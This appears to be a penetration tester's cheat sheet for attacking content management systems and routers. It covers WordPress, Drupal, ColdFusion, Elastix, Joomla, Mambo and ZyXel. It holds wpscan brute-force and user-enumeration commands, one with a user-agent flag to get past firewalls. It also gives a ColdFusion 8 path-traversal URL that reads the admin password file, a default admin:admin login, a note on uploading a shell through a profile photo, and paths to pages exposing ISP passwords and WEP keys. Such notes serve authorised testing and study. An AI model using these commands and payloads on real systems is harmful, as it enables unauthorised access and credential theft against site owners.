# CMS

* Enumerate version and few other details
* If don't found the version, download the source code and grep the version. We might found the page that contains the version then.
* Google their vulnerability
* Default password login page
* Guessing password login page?

## Wordpress

### wpscan

```
wpscan --url $ip/wp/
```

**Bruteforce login page**

```
wpscan --url <ip> --username <name> --wordlist <path to list>
```

```
wpscan --url yourwebsite.com -passwords file/path/passwords.txt
```

**Random agent  (**If your site runs behind a firewall, you can try the same command with an additional option added to the end:)

```
wpscan --url yourwebsite.com --random-user-agent
```

### User Enumeration with WPscan

```
Wpscan flags 
e/--enumerate = for enumeration 
u = users 
ap = all plugins 
```

```
wpscan --url yourwebsite.com -e u
```

```
wpscan --url yourwebsite.com/wordpress -e u
```

### User Enumeration and all plugins scan&#x20;

```
wpscan --url <websitename>/wordpress --enumerate u , ap
```

### Zoom.py - enumerate W

### wordpress users&#x20;

```
python zoom.py -u <wordpress site>
```

### Admin page&#x20;

```
/wp-admin
/wp-login
```

### Configuration files

```
setup-config.php
wp-config.php
```

### Enumerate users

```
/?author=1, /?author=2,
```

## Drupal

### Droopescan

```
droopescan scan drupal -u http://example.org/ -t 32
```

### Find version

```
/CHANGELOG.txt
```

## Adobe cold fusion

### Determine version

```
/CFIDE/adminapi/base.cfc?wsdl
```

### Version 8 vulnerability&#x20;

* fckeditor
* LFI :-&#x20;
* `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

## Elastix

* Google the vulnerabitlities
* default login are `admin:admin` at `/vtigercrm/`
* able to upload shell in profile-photo

## Joomla

* Admin page - `/administrator`
* Configuration files -&#x20;

```
configuration.php
diagnostics.php
joomla.inc.php
config.inc.php
```

## Mambo

#### Config files

```
configuration.php
config.inc.php  
```

## ZyXel

**Configuration files**

```
/WAN.html (contains PPPoE ISP password) 
/WLAN_General.html and /WLAN.html (contains WEP key) 
/rpDyDNS.html (contains DDNS credentials) 
/Firewall_DefPolicy.html (Firewall) 
/CF_Keyword.html (Content Filter) 
/RemMagWWW.html (Remote MGMT) 
/rpSysAdmin.html (System) 
/LAN_IP.html (LAN) 
/NAT_General.html (NAT) 
/ViewLog.html (Logs) 
/rpFWUpload.html (Tools) 
/DiagGeneral.html (Diagnostic) 
/RemMagSNMP.html (SNMP Passwords) 
/LAN_ClientList.html (Current DHCP Leases) 

# Config Backups
/RestoreCfg.html
/BackupCfg.html 
```
